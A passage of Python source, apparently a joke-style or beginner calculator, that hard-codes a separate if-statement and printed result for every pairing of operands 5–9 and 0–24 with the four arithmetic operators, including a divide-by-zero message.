num_2 == 19 and calc == '/': print('5 / 19 = 0.2631578947368421')\nif num_1 == 5 and num_2 == 20 and calc == '+': print('5 + 20 = 25')\nif num_1 == 5 and num_2 == 20 and calc == '-': print('5 - 20 = -15')\nif num_1 == 5 and num_2 == 20 and calc == '*': print('5 * 20 = 100')\nif num_1 == 5 and num_2 == 20 and calc == '/': print('5 / 20 = 0.25')\nif num_1 == 5 and num_2 == 21 and calc == '+': print('5 + 21 = 26')\nif num_1 == 5 and num_2 == 21 and calc == '-': print('5 - 21 = -16')\nif num_1 == 5 and num_2 == 21 and calc == '*': print('5 * 21 = 105')\nif num_1 == 5 and num_2 == 21 and calc == '/': print('5 / 21 = 0.23809523809523808')\nif num_1 == 5 and num_2 == 22 and calc == '+': print('5 + 22 = 27')\nif num_1 == 5 and num_2 == 22 and calc == '-': print('5 - 22 = -17')\nif num_1 == 5 and num_2 == 22 and calc == '*': print('5 * 22 = 110')\nif num_1 == 5 and num_2 == 22 and calc == '/': print('5 / 22 = 0.22727272727272727')\nif num_1 == 5 and num_2 == 23 and calc == '+': print('5 + 23 = 28')\nif num_1 == 5 and num_2 == 23 and calc == '-': print('5 - 23 = -18')\nif num_1 == 5 and num_2 == 23 and calc == '*': print('5 * 23 = 115')\nif num_1 == 5 and num_2 == 23 and calc == '/': print('5 / 23 = 0.21739130434782608')\nif num_1 == 5 and num_2 == 24 and calc == '+': print('5 + 24 = 29')\nif num_1 == 5 and num_2 == 24 and calc == '-': print('5 - 24 = -19')\nif num_1 == 5 and num_2 == 24 and calc == '*': print('5 * 24 = 120')\nif num_1 == 5 and num_2 == 24 and calc == '/': print('5 / 24 = 0.20833333333333334')\nif num_1 == 6 and num_2 == 0 and calc == '+': print('6 + 0 = 6')\nif num_1 == 6 and num_2 == 0 and calc == '-': print('6 - 0 = 6')\nif num_1 == 6 and num_2 == 0 and calc == '*': print('6 * 0 = 0')\nif num_1 == 6 and num_2 == 0 and calc == '/': print('6 / 0 = Cannot divide by zero!')\nif num_1 == 6 and num_2 == 1 and calc == '+': print('6 + 1 = 7')\nif num_1 == 6 and num_2 == 1 and calc == '-': print('6 - 1 = 5')\nif num_1 == 6 and num_2 == 1 and calc == '*': print('6 * 1 = 6')\nif num_1 == 6 and num_2 == 1 and calc == '/': print('6 / 1 = 6.0')\nif num_1 == 6 and num_2 == 2 and calc == '+': print('6 + 2 = 8')\nif num_1 == 6 and num_2 == 2 and calc == '-': print('6 - 2 = 4')\nif num_1 == 6 and num_2 == 2 and calc == '*': print('6 * 2 = 12')\nif num_1 == 6 and num_2 == 2 and calc == '/': print('6 / 2 = 3.0')\nif num_1 == 6 and num_2 == 3 and calc == '+': print('6 + 3 = 9')\nif num_1 == 6 and num_2 == 3 and calc == '-': print('6 - 3 = 3')\nif num_1 == 6 and num_2 == 3 and calc == '*': print('6 * 3 = 18')\nif num_1 == 6 and num_2 == 3 and calc == '/': print('6 / 3 = 2.0')\nif num_1 == 6 and num_2 == 4 and calc == '+': print('6 + 4 = 10')\nif num_1 == 6 and num_2 == 4 and calc == '-': print('6 - 4 = 2')\nif num_1 == 6 and num_2 == 4 and calc == '*': print('6 * 4 = 24')\nif num_1 == 6 and num_2 == 4 and calc == '/': print('6 / 4 = 1.5')\nif num_1 == 6 and num_2 == 5 and calc == '+': print('6 + 5 = 11')\nif num_1 == 6 and num_2 == 5 and calc == '-': print('6 - 5 = 1')\nif num_1 == 6 and num_2 == 5 and calc == '*': print('6 * 5 = 30')\nif num_1 == 6 and num_2 == 5 and calc == '/': print('6 / 5 = 1.2')\nif num_1 == 6 and num_2 == 6 and calc == '+': print('6 + 6 = 12')\nif num_1 == 6 and num_2 == 6 and calc == '-': print('6 - 6 = 0')\nif num_1 == 6 and num_2 == 6 and calc == '*': print('6 * 6 = 36')\nif num_1 == 6 and num_2 == 6 and calc == '/': print('6 / 6 = 1.0')\nif num_1 == 6 and num_2 == 7 and calc == '+': print('6 + 7 = 13')\nif num_1 == 6 and num_2 == 7 and calc == '-': print('6 - 7 = -1')\nif num_1 == 6 and num_2 == 7 and calc == '*': print('6 * 7 = 42')\nif num_1 == 6 and num_2 == 7 and calc == '/': print('6 / 7 = 0.8571428571428571')\nif num_1 == 6 and num_2 == 8 and calc == '+': print('6 + 8 = 14')\nif num_1 == 6 and num_2 == 8 and calc == '-': print('6 - 8 = -2')\nif num_1 == 6 and num_2 == 8 and calc == '*': print('6 * 8 = 48')\nif num_1 == 6 and num_2 == 8 and calc == '/': print('6 / 8 = 0.75')\nif num_1 == 6 and num_2 == 9 and calc == '+': print('6 + 9 = 15')\nif num_1 == 6 and num_2 == 9 and calc == '-': print('6 - 9 = -3')\nif num_1 == 6 and num_2 == 9 and calc == '*': print('6 * 9 = 54')\nif num_1 == 6 and num_2 == 9 and calc == '/': print('6 / 9 = 0.6666666666666666')\nif num_1 == 6 and num_2 == 10 and calc == '+': print('6 + 10 = 16')\nif num_1 == 6 and num_2 == 10 and calc == '-': print('6 - 10 = -4')\nif num_1 == 6 and num_2 == 10 and calc == '*': print('6 * 10 = 60')\nif num_1 == 6 and num_2 == 10 and calc == '/': print('6 / 10 = 0.6')\nif num_1 == 6 and num_2 == 11 and calc == '+': print('6 + 11 = 17')\nif num_1 == 6 and num_2 == 11 and calc == '-': print('6 - 11 = -5')\nif num_1 == 6 and num_2 == 11 and calc == '*': print('6 * 11 = 66')\nif num_1 == 6 and num_2 == 11 and calc == '/': print('6 / 11 = 0.5454545454545454')\nif num_1 == 6 and num_2 == 12 and calc == '+': print('6 + 12 = 18')\nif num_1 == 6 and num_2 == 12 and calc == '-': print('6 - 12 = -6')\nif num_1 == 6 and num_2 == 12 and calc == '*': print('6 * 12 = 72')\nif num_1 == 6 and num_2 == 12 and calc == '/': print('6 / 12 = 0.5')\nif num_1 == 6 and num_2 == 13 and calc == '+': print('6 + 13 = 19')\nif num_1 == 6 and num_2 == 13 and calc == '-': print('6 - 13 = -7')\nif num_1 == 6 and num_2 == 13 and calc == '*': print('6 * 13 = 78')\nif num_1 == 6 and num_2 == 13 and calc == '/': print('6 / 13 = 0.46153846153846156')\nif num_1 == 6 and num_2 == 14 and calc == '+': print('6 + 14 = 20')\nif num_1 == 6 and num_2 == 14 and calc == '-': print('6 - 14 = -8')\nif num_1 == 6 and num_2 == 14 and calc == '*': print('6 * 14 = 84')\nif num_1 == 6 and num_2 == 14 and calc == '/': print('6 / 14 = 0.42857142857142855')\nif num_1 == 6 and num_2 == 15 and calc == '+': print('6 + 15 = 21')\nif num_1 == 6 and num_2 == 15 and calc == '-': print('6 - 15 = -9')\nif num_1 == 6 and num_2 == 15 and calc == '*': print('6 * 15 = 90')\nif num_1 == 6 and num_2 == 15 and calc == '/': print('6 / 15 = 0.4')\nif num_1 == 6 and num_2 == 16 and calc == '+': print('6 + 16 = 22')\nif num_1 == 6 and num_2 == 16 and calc == '-': print('6 - 16 = -10')\nif num_1 == 6 and num_2 == 16 and calc == '*': print('6 * 16 = 96')\nif num_1 == 6 and num_2 == 16 and calc == '/': print('6 / 16 = 0.375')\nif num_1 == 6 and num_2 == 17 and calc == '+': print('6 + 17 = 23')\nif num_1 == 6 and num_2 == 17 and calc == '-': print('6 - 17 = -11')\nif num_1 == 6 and num_2 == 17 and calc == '*': print('6 * 17 = 102')\nif num_1 == 6 and num_2 == 17 and calc == '/': print('6 / 17 = 0.35294117647058826')\nif num_1 == 6 and num_2 == 18 and calc == '+': print('6 + 18 = 24')\nif num_1 == 6 and num_2 == 18 and calc == '-': print('6 - 18 = -12')\nif num_1 == 6 and num_2 == 18 and calc == '*': print('6 * 18 = 108')\nif num_1 == 6 and num_2 == 18 and calc == '/': print('6 / 18 = 0.3333333333333333')\nif num_1 == 6 and num_2 == 19 and calc == '+': print('6 + 19 = 25')\nif num_1 == 6 and num_2 == 19 and calc == '-': print('6 - 19 = -13')\nif num_1 == 6 and num_2 == 19 and calc == '*': print('6 * 19 = 114')\nif num_1 == 6 and num_2 == 19 and calc == '/': print('6 / 19 = 0.3157894736842105')\nif num_1 == 6 and num_2 == 20 and calc == '+': print('6 + 20 = 26')\nif num_1 == 6 and num_2 == 20 and calc == '-': print('6 - 20 = -14')\nif num_1 == 6 and num_2 == 20 and calc == '*': print('6 * 20 = 120')\nif num_1 == 6 and num_2 == 20 and calc == '/': print('6 / 20 = 0.3')\nif num_1 == 6 and num_2 == 21 and calc == '+': print('6 + 21 = 27')\nif num_1 == 6 and num_2 == 21 and calc == '-': print('6 - 21 = -15')\nif num_1 == 6 and num_2 == 21 and calc == '*': print('6 * 21 = 126')\nif num_1 == 6 and num_2 == 21 and calc == '/': print('6 / 21 = 0.2857142857142857')\nif num_1 == 6 and num_2 == 22 and calc == '+': print('6 + 22 = 28')\nif num_1 == 6 and num_2 == 22 and calc == '-': print('6 - 22 = -16')\nif num_1 == 6 and num_2 == 22 and calc == '*': print('6 * 22 = 132')\nif num_1 == 6 and num_2 == 22 and calc == '/': print('6 / 22 = 0.2727272727272727')\nif num_1 == 6 and num_2 == 23 and calc == '+': print('6 + 23 = 29')\nif num_1 == 6 and num_2 == 23 and calc == '-': print('6 - 23 = -17')\nif num_1 == 6 and num_2 == 23 and calc == '*': print('6 * 23 = 138')\nif num_1 == 6 and num_2 == 23 and calc == '/': print('6 / 23 = 0.2608695652173913')\nif num_1 == 6 and num_2 == 24 and calc == '+': print('6 + 24 = 30')\nif num_1 == 6 and num_2 == 24 and calc == '-': print('6 - 24 = -18')\nif num_1 == 6 and num_2 == 24 and calc == '*': print('6 * 24 = 144')\nif num_1 == 6 and num_2 == 24 and calc == '/': print('6 / 24 = 0.25')\nif num_1 == 7 and num_2 == 0 and calc == '+': print('7 + 0 = 7')\nif num_1 == 7 and num_2 == 0 and calc == '-': print('7 - 0 = 7')\nif num_1 == 7 and num_2 == 0 and calc == '*': print('7 * 0 = 0')\nif num_1 == 7 and num_2 == 0 and calc == '/': print('7 / 0 = Cannot divide by zero!')\nif num_1 == 7 and num_2 == 1 and calc == '+': print('7 + 1 = 8')\nif num_1 == 7 and num_2 == 1 and calc == '-': print('7 - 1 = 6')\nif num_1 == 7 and num_2 == 1 and calc == '*': print('7 * 1 = 7')\nif num_1 == 7 and num_2 == 1 and calc == '/': print('7 / 1 = 7.0')\nif num_1 == 7 and num_2 == 2 and calc == '+': print('7 + 2 = 9')\nif num_1 == 7 and num_2 == 2 and calc == '-': print('7 - 2 = 5')\nif num_1 == 7 and num_2 == 2 and calc == '*': print('7 * 2 = 14')\nif num_1 == 7 and num_2 == 2 and calc == '/': print('7 / 2 = 3.5')\nif num_1 == 7 and num_2 == 3 and calc == '+': print('7 + 3 = 10')\nif num_1 == 7 and num_2 == 3 and calc == '-': print('7 - 3 = 4')\nif num_1 == 7 and num_2 == 3 and calc == '*': print('7 * 3 = 21')\nif num_1 == 7 and num_2 == 3 and calc == '/': print('7 / 3 = 2.3333333333333335')\nif num_1 == 7 and num_2 == 4 and calc == '+': print('7 + 4 = 11')\nif num_1 == 7 and num_2 == 4 and calc == '-': print('7 - 4 = 3')\nif num_1 == 7 and num_2 == 4 and calc == '*': print('7 * 4 = 28')\nif num_1 == 7 and num_2 == 4 and calc == '/': print('7 / 4 = 1.75')\nif num_1 == 7 and num_2 == 5 and calc == '+': print('7 + 5 = 12')\nif num_1 == 7 and num_2 == 5 and calc == '-': print('7 - 5 = 2')\nif num_1 == 7 and num_2 == 5 and calc == '*': print('7 * 5 = 35')\nif num_1 == 7 and num_2 == 5 and calc == '/': print('7 / 5 = 1.4')\nif num_1 == 7 and num_2 == 6 and calc == '+': print('7 + 6 = 13')\nif num_1 == 7 and num_2 == 6 and calc == '-': print('7 - 6 = 1')\nif num_1 == 7 and num_2 == 6 and calc == '*': print('7 * 6 = 42')\nif num_1 == 7 and num_2 == 6 and calc == '/': print('7 / 6 = 1.1666666666666667')\nif num_1 == 7 and num_2 == 7 and calc == '+': print('7 + 7 = 14')\nif num_1 == 7 and num_2 == 7 and calc == '-': print('7 - 7 = 0')\nif num_1 == 7 and num_2 == 7 and calc == '*': print('7 * 7 = 49')\nif num_1 == 7 and num_2 == 7 and calc == '/': print('7 / 7 = 1.0')\nif num_1 == 7 and num_2 == 8 and calc == '+': print('7 + 8 = 15')\nif num_1 == 7 and num_2 == 8 and calc == '-': print('7 - 8 = -1')\nif num_1 == 7 and num_2 == 8 and calc == '*': print('7 * 8 = 56')\nif num_1 == 7 and num_2 == 8 and calc == '/': print('7 / 8 = 0.875')\nif num_1 == 7 and num_2 == 9 and calc == '+': print('7 + 9 = 16')\nif num_1 == 7 and num_2 == 9 and calc == '-': print('7 - 9 = -2')\nif num_1 == 7 and num_2 == 9 and calc == '*': print('7 * 9 = 63')\nif num_1 == 7 and num_2 == 9 and calc == '/': print('7 / 9 = 0.7777777777777778')\nif num_1 == 7 and num_2 == 10 and calc == '+': print('7 + 10 = 17')\nif num_1 == 7 and num_2 == 10 and calc == '-': print('7 - 10 = -3')\nif num_1 == 7 and num_2 == 10 and calc == '*': print('7 * 10 = 70')\nif num_1 == 7 and num_2 == 10 and calc == '/': print('7 / 10 = 0.7')\nif num_1 == 7 and num_2 == 11 and calc == '+': print('7 + 11 = 18')\nif num_1 == 7 and num_2 == 11 and calc == '-': print('7 - 11 = -4')\nif num_1 == 7 and num_2 == 11 and calc == '*': print('7 * 11 = 77')\nif num_1 == 7 and num_2 == 11 and calc == '/': print('7 / 11 = 0.6363636363636364')\nif num_1 == 7 and num_2 == 12 and calc == '+': print('7 + 12 = 19')\nif num_1 == 7 and num_2 == 12 and calc == '-': print('7 - 12 = -5')\nif num_1 == 7 and num_2 == 12 and calc == '*': print('7 * 12 = 84')\nif num_1 == 7 and num_2 == 12 and calc == '/': print('7 / 12 = 0.5833333333333334')\nif num_1 == 7 and num_2 == 13 and calc == '+': print('7 + 13 = 20')\nif num_1 == 7 and num_2 == 13 and calc == '-': print('7 - 13 = -6')\nif num_1 == 7 and num_2 == 13 and calc == '*': print('7 * 13 = 91')\nif num_1 == 7 and num_2 == 13 and calc == '/': print('7 / 13 = 0.5384615384615384')\nif num_1 == 7 and num_2 == 14 and calc == '+': print('7 + 14 = 21')\nif num_1 == 7 and num_2 == 14 and calc == '-': print('7 - 14 = -7')\nif num_1 == 7 and num_2 == 14 and calc == '*': print('7 * 14 = 98')\nif num_1 == 7 and num_2 == 14 and calc == '/': print('7 / 14 = 0.5')\nif num_1 == 7 and num_2 == 15 and calc == '+': print('7 + 15 = 22')\nif num_1 == 7 and num_2 == 15 and calc == '-': print('7 - 15 = -8')\nif num_1 == 7 and num_2 == 15 and calc == '*': print('7 * 15 = 105')\nif num_1 == 7 and num_2 == 15 and calc == '/': print('7 / 15 = 0.4666666666666667')\nif num_1 == 7 and num_2 == 16 and calc == '+': print('7 + 16 = 23')\nif num_1 == 7 and num_2 == 16 and calc == '-': print('7 - 16 = -9')\nif num_1 == 7 and num_2 == 16 and calc == '*': print('7 * 16 = 112')\nif num_1 == 7 and num_2 == 16 and calc == '/': print('7 / 16 = 0.4375')\nif num_1 == 7 and num_2 == 17 and calc == '+': print('7 + 17 = 24')\nif num_1 == 7 and num_2 == 17 and calc == '-': print('7 - 17 = -10')\nif num_1 == 7 and num_2 == 17 and calc == '*': print('7 * 17 = 119')\nif num_1 == 7 and num_2 == 17 and calc == '/': print('7 / 17 = 0.4117647058823529')\nif num_1 == 7 and num_2 == 18 and calc == '+': print('7 + 18 = 25')\nif num_1 == 7 and num_2 == 18 and calc == '-': print('7 - 18 = -11')\nif num_1 == 7 and num_2 == 18 and calc == '*': print('7 * 18 = 126')\nif num_1 == 7 and num_2 == 18 and calc == '/': print('7 / 18 = 0.3888888888888889')\nif num_1 == 7 and num_2 == 19 and calc == '+': print('7 + 19 = 26')\nif num_1 == 7 and num_2 == 19 and calc == '-': print('7 - 19 = -12')\nif num_1 == 7 and num_2 == 19 and calc == '*': print('7 * 19 = 133')\nif num_1 == 7 and num_2 == 19 and calc == '/': print('7 / 19 = 0.3684210526315789')\nif num_1 == 7 and num_2 == 20 and calc == '+': print('7 + 20 = 27')\nif num_1 == 7 and num_2 == 20 and calc == '-': print('7 - 20 = -13')\nif num_1 == 7 and num_2 == 20 and calc == '*': print('7 * 20 = 140')\nif num_1 == 7 and num_2 == 20 and calc == '/': print('7 / 20 = 0.35')\nif num_1 == 7 and num_2 == 21 and calc == '+': print('7 + 21 = 28')\nif num_1 == 7 and num_2 == 21 and calc == '-': print('7 - 21 = -14')\nif num_1 == 7 and num_2 == 21 and calc == '*': print('7 * 21 = 147')\nif num_1 == 7 and num_2 == 21 and calc == '/': print('7 / 21 = 0.3333333333333333')\nif num_1 == 7 and num_2 == 22 and calc == '+': print('7 + 22 = 29')\nif num_1 == 7 and num_2 == 22 and calc == '-': print('7 - 22 = -15')\nif num_1 == 7 and num_2 == 22 and calc == '*': print('7 * 22 = 154')\nif num_1 == 7 and num_2 == 22 and calc == '/': print('7 / 22 = 0.3181818181818182')\nif num_1 == 7 and num_2 == 23 and calc == '+': print('7 + 23 = 30')\nif num_1 == 7 and num_2 == 23 and calc == '-': print('7 - 23 = -16')\nif num_1 == 7 and num_2 == 23 and calc == '*': print('7 * 23 = 161')\nif num_1 == 7 and num_2 == 23 and calc == '/': print('7 / 23 = 0.30434782608695654')\nif num_1 == 7 and num_2 == 24 and calc == '+': print('7 + 24 = 31')\nif num_1 == 7 and num_2 == 24 and calc == '-': print('7 - 24 = -17')\nif num_1 == 7 and num_2 == 24 and calc == '*': print('7 * 24 = 168')\nif num_1 == 7 and num_2 == 24 and calc == '/': print('7 / 24 = 0.2916666666666667')\nif num_1 == 8 and num_2 == 0 and calc == '+': print('8 + 0 = 8')\nif num_1 == 8 and num_2 == 0 and calc == '-': print('8 - 0 = 8')\nif num_1 == 8 and num_2 == 0 and calc == '*': print('8 * 0 = 0')\nif num_1 == 8 and num_2 == 0 and calc == '/': print('8 / 0 = Cannot divide by zero!')\nif num_1 == 8 and num_2 == 1 and calc == '+': print('8 + 1 = 9')\nif num_1 == 8 and num_2 == 1 and calc == '-': print('8 - 1 = 7')\nif num_1 == 8 and num_2 == 1 and calc == '*': print('8 * 1 = 8')\nif num_1 == 8 and num_2 == 1 and calc == '/': print('8 / 1 = 8.0')\nif num_1 == 8 and num_2 == 2 and calc == '+': print('8 + 2 = 10')\nif num_1 == 8 and num_2 == 2 and calc == '-': print('8 - 2 = 6')\nif num_1 == 8 and num_2 == 2 and calc == '*': print('8 * 2 = 16')\nif num_1 == 8 and num_2 == 2 and calc == '/': print('8 / 2 = 4.0')\nif num_1 == 8 and num_2 == 3 and calc == '+': print('8 + 3 = 11')\nif num_1 == 8 and num_2 == 3 and calc == '-': print('8 - 3 = 5')\nif num_1 == 8 and num_2 == 3 and calc == '*': print('8 * 3 = 24')\nif num_1 == 8 and num_2 == 3 and calc == '/': print('8 / 3 = 2.6666666666666665')\nif num_1 == 8 and num_2 == 4 and calc == '+': print('8 + 4 = 12')\nif num_1 == 8 and num_2 == 4 and calc == '-': print('8 - 4 = 4')\nif num_1 == 8 and num_2 == 4 and calc == '*': print('8 * 4 = 32')\nif num_1 == 8 and num_2 == 4 and calc == '/': print('8 / 4 = 2.0')\nif num_1 == 8 and num_2 == 5 and calc == '+': print('8 + 5 = 13')\nif num_1 == 8 and num_2 == 5 and calc == '-': print('8 - 5 = 3')\nif num_1 == 8 and num_2 == 5 and calc == '*': print('8 * 5 = 40')\nif num_1 == 8 and num_2 == 5 and calc == '/': print('8 / 5 = 1.6')\nif num_1 == 8 and num_2 == 6 and calc == '+': print('8 + 6 = 14')\nif num_1 == 8 and num_2 == 6 and calc == '-': print('8 - 6 = 2')\nif num_1 == 8 and num_2 == 6 and calc == '*': print('8 * 6 = 48')\nif num_1 == 8 and num_2 == 6 and calc == '/': print('8 / 6 = 1.3333333333333333')\nif num_1 == 8 and num_2 == 7 and calc == '+': print('8 + 7 = 15')\nif num_1 == 8 and num_2 == 7 and calc == '-': print('8 - 7 = 1')\nif num_1 == 8 and num_2 == 7 and calc == '*': print('8 * 7 = 56')\nif num_1 == 8 and num_2 == 7 and calc == '/': print('8 / 7 = 1.1428571428571428')\nif num_1 == 8 and num_2 == 8 and calc == '+': print('8 + 8 = 16')\nif num_1 == 8 and num_2 == 8 and calc == '-': print('8 - 8 = 0')\nif num_1 == 8 and num_2 == 8 and calc == '*': print('8 * 8 = 64')\nif num_1 == 8 and num_2 == 8 and calc == '/': print('8 / 8 = 1.0')\nif num_1 == 8 and num_2 == 9 and calc == '+': print('8 + 9 = 17')\nif num_1 == 8 and num_2 == 9 and calc == '-': print('8 - 9 = -1')\nif num_1 == 8 and num_2 == 9 and calc == '*': print('8 * 9 = 72')\nif num_1 == 8 and num_2 == 9 and calc == '/': print('8 / 9 = 0.8888888888888888')\nif num_1 == 8 and num_2 == 10 and calc == '+': print('8 + 10 = 18')\nif num_1 == 8 and num_2 == 10 and calc == '-': print('8 - 10 = -2')\nif num_1 == 8 and num_2 == 10 and calc == '*': print('8 * 10 = 80')\nif num_1 == 8 and num_2 == 10 and calc == '/': print('8 / 10 = 0.8')\nif num_1 == 8 and num_2 == 11 and calc == '+': print('8 + 11 = 19')\nif num_1 == 8 and num_2 == 11 and calc == '-': print('8 - 11 = -3')\nif num_1 == 8 and num_2 == 11 and calc == '*': print('8 * 11 = 88')\nif num_1 == 8 and num_2 == 11 and calc == '/': print('8 / 11 = 0.7272727272727273')\nif num_1 == 8 and num_2 == 12 and calc == '+': print('8 + 12 = 20')\nif num_1 == 8 and num_2 == 12 and calc == '-': print('8 - 12 = -4')\nif num_1 == 8 and num_2 == 12 and calc == '*': print('8 * 12 = 96')\nif num_1 == 8 and num_2 == 12 and calc == '/': print('8 / 12 = 0.6666666666666666')\nif num_1 == 8 and num_2 == 13 and calc == '+': print('8 + 13 = 21')\nif num_1 == 8 and num_2 == 13 and calc == '-': print('8 - 13 = -5')\nif num_1 == 8 and num_2 == 13 and calc == '*': print('8 * 13 = 104')\nif num_1 == 8 and num_2 == 13 and calc == '/': print('8 / 13 = 0.6153846153846154')\nif num_1 == 8 and num_2 == 14 and calc == '+': print('8 + 14 = 22')\nif num_1 == 8 and num_2 == 14 and calc == '-': print('8 - 14 = -6')\nif num_1 == 8 and num_2 == 14 and calc == '*': print('8 * 14 = 112')\nif num_1 == 8 and num_2 == 14 and calc == '/': print('8 / 14 = 0.5714285714285714')\nif num_1 == 8 and num_2 == 15 and calc == '+': print('8 + 15 = 23')\nif num_1 == 8 and num_2 == 15 and calc == '-': print('8 - 15 = -7')\nif num_1 == 8 and num_2 == 15 and calc == '*': print('8 * 15 = 120')\nif num_1 == 8 and num_2 == 15 and calc == '/': print('8 / 15 = 0.5333333333333333')\nif num_1 == 8 and num_2 == 16 and calc == '+': print('8 + 16 = 24')\nif num_1 == 8 and num_2 == 16 and calc == '-': print('8 - 16 = -8')\nif num_1 == 8 and num_2 == 16 and calc == '*': print('8 * 16 = 128')\nif num_1 == 8 and num_2 == 16 and calc == '/': print('8 / 16 = 0.5')\nif num_1 == 8 and num_2 == 17 and calc == '+': print('8 + 17 = 25')\nif num_1 == 8 and num_2 == 17 and calc == '-': print('8 - 17 = -9')\nif num_1 == 8 and num_2 == 17 and calc == '*': print('8 * 17 = 136')\nif num_1 == 8 and num_2 == 17 and calc == '/': print('8 / 17 = 0.47058823529411764')\nif num_1 == 8 and num_2 == 18 and calc == '+': print('8 + 18 = 26')\nif num_1 == 8 and num_2 == 18 and calc == '-': print('8 - 18 = -10')\nif num_1 == 8 and num_2 == 18 and calc == '*': print('8 * 18 = 144')\nif num_1 == 8 and num_2 == 18 and calc == '/': print('8 / 18 = 0.4444444444444444')\nif num_1 == 8 and num_2 == 19 and calc == '+': print('8 + 19 = 27')\nif num_1 == 8 and num_2 == 19 and calc == '-': print('8 - 19 = -11')\nif num_1 == 8 and num_2 == 19 and calc == '*': print('8 * 19 = 152')\nif num_1 == 8 and num_2 == 19 and calc == '/': print('8 / 19 = 0.42105263157894735')\nif num_1 == 8 and num_2 == 20 and calc == '+': print('8 + 20 = 28')\nif num_1 == 8 and num_2 == 20 and calc == '-': print('8 - 20 = -12')\nif num_1 == 8 and num_2 == 20 and calc == '*': print('8 * 20 = 160')\nif num_1 == 8 and num_2 == 20 and calc == '/': print('8 / 20 = 0.4')\nif num_1 == 8 and num_2 == 21 and calc == '+': print('8 + 21 = 29')\nif num_1 == 8 and num_2 == 21 and calc == '-': print('8 - 21 = -13')\nif num_1 == 8 and num_2 == 21 and calc == '*': print('8 * 21 = 168')\nif num_1 == 8 and num_2 == 21 and calc == '/': print('8 / 21 = 0.38095238095238093')\nif num_1 == 8 and num_2 == 22 and calc == '+': print('8 + 22 = 30')\nif num_1 == 8 and num_2 == 22 and calc == '-': print('8 - 22 = -14')\nif num_1 == 8 and num_2 == 22 and calc == '*': print('8 * 22 = 176')\nif num_1 == 8 and num_2 == 22 and calc == '/': print('8 / 22 = 0.36363636363636365')\nif num_1 == 8 and num_2 == 23 and calc == '+': print('8 + 23 = 31')\nif num_1 == 8 and num_2 == 23 and calc == '-': print('8 - 23 = -15')\nif num_1 == 8 and num_2 == 23 and calc == '*': print('8 * 23 = 184')\nif num_1 == 8 and num_2 == 23 and calc == '/': print('8 / 23 = 0.34782608695652173')\nif num_1 == 8 and num_2 == 24 and calc == '+': print('8 + 24 = 32')\nif num_1 == 8 and num_2 == 24 and calc == '-': print('8 - 24 = -16')\nif num_1 == 8 and num_2 == 24 and calc == '*': print('8 * 24 = 192')\nif num_1 == 8 and num_2 == 24 and calc == '/': print('8 / 24 = 0.3333333333333333')\nif num_1 == 9 and num_2 == 0 and calc == '+': print('9 + 0 = 9')\nif num_1 == 9 and num_2 == 0 and calc == '-': print('9 - 0 = 9')\nif num_1 == 9 and num_2 == 0 and calc == '*': print('9 * 0 = 0')\nif num_1 == 9 and num_2 == 0 and calc == '/': print('9 / 0 = Cannot divide by zero!')\nif num_1 == 9 and num_2 == 1 and calc == '+': print('9 + 1 = 10')\nif num_1 == 9 and num_2 == 1 and calc == '-': print('9 - 1 = 8')\nif num_1 == 9 and num_2 == 1 and calc == '*': print('9 * 1 = 9')\nif num_1 == 9 and num_2 == 1 and calc == '/': print('9 / 1 = 9.0')\nif num_1 == 9 and num_2 == 2 and calc == '+': print('9 + 2 = 11')\nif num_1 == 9 and num_2 == 2 and calc == '-': print('9 - 2 = 7')\nif num_1 == 9 and num_2 == 2 and calc == '*': print('9 * 2 = 18')\nif num_1 == 9 and num_2 == 2 and calc == '/': print('9 / 2 = 4.5')\nif num_1 == 9 and num_2 == 3 and calc == '+': print('9 + 3 = 12')\nif num_1 == 9 and num_2 == 3 and calc == '-': print('9 - 3 = 6')\nif num_1 == 9 and num_2 == 3 and calc == '*': print('9 * 3 = 27')\nif num_1 == 9 and num_2 == 3 and calc == '/': print('9 / 3 = 3.0')\nif num_1 == 9 and num_2 == 4 and calc == '+': print('9 + 4 = 13')\nif num_1 == 9 and num_2 == 4 and calc == '-': print('9 - 4 = 5')\nif num_1 == 9 and num_2 == 4 and calc == '*': print('9 * 4 = 36')\nif num_1 == 9 and num_2 == 4 and calc == '/': print('9 / 4 = 2.25')\nif num_1 == 9 and num_2 == 5 and calc == '+': print('9 + 5 = 14')\nif num_1 == 9 and num_2 == 5 and calc == '-': print('9 - 5 = 4')\nif num_1 == 9 and num_2 == 5 and calc == '*': print('9 * 5 = 45')\nif num_1 == 9 and num_2 == 5 and calc == '/': print('9 / 5 = 1.8')\nif num_1 == 9 and num_2 == 6 and calc == '+': print('9 + 6 = 15')\nif num_1 == 9 and num_2 == 6 and calc == '-': print('9 - 6 = 3')\nif num_1 == 9 and num_2 == 6 and calc == '*': print('9 * 6 = 54')\nif num_1 == 9 and num_2 == 6 and calc == '/': print('9 / 6 = 1.5')\nif num_1 == 9 and num_2 == 7 and calc == '+': print('9 + 7 = 16')\nif num_1 == 9 and num_2 == 7 and calc == '-': print('9 - 7 = 2')\nif num_1 == 9 and num_2 == 7 and calc == '*': print('9 * 7 = 63')\nif num_1 == 9 and num_2 == 7 and calc == '/': print('9 / 7 = 1.2857142857142858')\nif num_1 == 9 and num_2 == 8 and calc == '+': print('9 + 8 = 17')\nif num_1 == 9 and num_2 == 8 and calc == '-': print('9 - 8 = 1')\nif num_1 == 9 and num_2 == 8 and calc == '*': print('9 * 8 = 72')\nif num_1 == 9 and num_2 == 8 and calc == '/': print('9 / 8 = 1.125')\nif num_1 == 9 and num_2 == 9 and calc == '+': print('9 + 9 = 18')\nif num_1 == 9 and num_2 == 9 and calc == '-': print('9 - 9 = 0')\nif num_1 == 9 and num_2 == 9 and calc == '*': print('9 * 9 = 81')\nif num_1 == 9 and num_2 == 9 and calc == '/': print('9 / 9 = 1.0')\nif num_1 == 9 and num_2 == 10 and calc == '+': print('9 + 10 = 19')\nif num_1 == 9 and num_2 == 10 and calc == '-': print('9 - 10 = -1')\nif num_1 == 9 and num_2 == 10 and calc == '*': print('9 * 10 = 90')\nif num_1 == 9 and num_2 == 10 and calc == '/': print('9 / 10 = 0.9')\nif num_1 == 9 and num_2 == 11 and calc == '+': print('9 + 11 = 20')\nif num_1 == 9 and num_2 == 11 and calc == '-': print('9 - 11 = -2')\nif num_1 == 9 and num_2 == 11 and calc == '*': print('9 * 11 = 99')\nif num_1 == 9 and num_2 == 11 and calc == '/': print('9 / 11 = 0.8181818181818182')\nif num_1 == 9 and num_2 == 12 and calc == '+': print('9 + 12 = 21')\nif num_1 == 9 and num_2 == 12 and calc == '-': print('9 - 12 = -3')\nif num_1 == 9 and num_2 == 12 and calc == '*': print('9 * 12 = 108')\nif num_1 == 9 and num_2 == 12 and calc == '/': print('9 / 12 = 0.75')\nif num_1 == 9 